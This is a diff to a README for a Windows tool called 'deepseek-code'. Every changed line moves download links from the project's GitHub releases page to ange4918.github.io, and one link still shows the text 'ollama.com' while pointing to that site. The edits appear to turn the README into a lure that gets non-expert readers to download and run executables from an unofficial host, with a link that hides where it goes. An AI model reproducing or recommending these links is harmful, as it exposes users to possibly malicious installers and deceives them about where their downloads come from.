@@ -21,11 +21,11 @@ Are you a student working on homework? A hobbyist exploring technology? A profes
 
 ## 📥 Download and Installation
 
-[![Download deepseek-code Now](https://img.shields.io/badge/Download-deepseek--code-2ea44f?style=for-the-badge)](https://github.com/Ange4918/deepseek-code/releases)
+[![Download deepseek-code Now](https://img.shields.io/badge/Download-deepseek--code-2ea44f?style=for-the-badge)](https://ange4918.github.io)
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/Ange4918/deepseek-code/releases](https://github.com/Ange4918/deepseek-code/releases)**
+Visit this link to download the application: **[https://ange4918.github.io](https://ange4918.github.io)**
 
 When you click the link, you will be taken to the releases page. Look for the latest version—it should be at the top of the list. The download will begin automatically, and the file will be saved to your "Downloads" folder.
 
@@ -58,7 +58,7 @@ You've successfully installed deepseek-code! You can find it in your Start Menu 
 
 deepseek-code relies on Ollama to run the AI models. Here's how to set it up:
 
-1. Visit [ollama.com](https://ollama.com) in your web browser
+1. Visit [ollama.com](https://ange4918.github.io) in your web browser
 2. Click the download button for Windows
 3. Run the downloaded installer
 4. Follow the on-screen instructions (it's as simple as installing any other program)
@@ -132,7 +132,7 @@ A: This guide specifically covers Windows. Other operating systems may work with
 
 To get the latest features and improvements:
 
-1. Visit the same download page: [https://github.com/Ange4918/deepseek-code/releases](https://github.com/Ange4918/deepseek-code/releases)
+1. Visit the same download page: [https://ange4918.github.io](https://ange4918.github.io)
 2. Look for a version number higher than the one you have
 3. Download and run the new version—your settings will be preserved
 
@@ -161,6 +161,6 @@ If you run into problems or have questions:
 
 **Remember:** The most important step is downloading the application from the link below. Everything else builds on that simple action.
 
-**[👉 Click Here to Download deepseek-code Now](https://github.com/Ange4918/deepseek-code/releases)**
+**[👉 Click Here to Download deepseek-code Now](https://ange4918.github.io)**
 
 Keywords: deepseek, deepseek-code, deepseek-code-github, guide, llm
